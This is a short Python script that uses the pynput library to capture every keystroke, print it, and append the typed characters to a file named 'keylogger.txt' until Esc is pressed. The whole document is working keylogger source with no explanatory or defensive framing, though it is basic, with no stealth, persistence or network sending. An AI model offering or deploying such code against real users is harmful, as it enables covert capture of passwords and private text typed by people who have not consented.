from pynput import keyboard
def on_press(key):
    print(str(key))
    with open("keylogger.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")
    if key == keyboard.Key.esc:
        # Stop listening for key presses
        return False
def main():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()

if __name__ == "__main__":
    main()
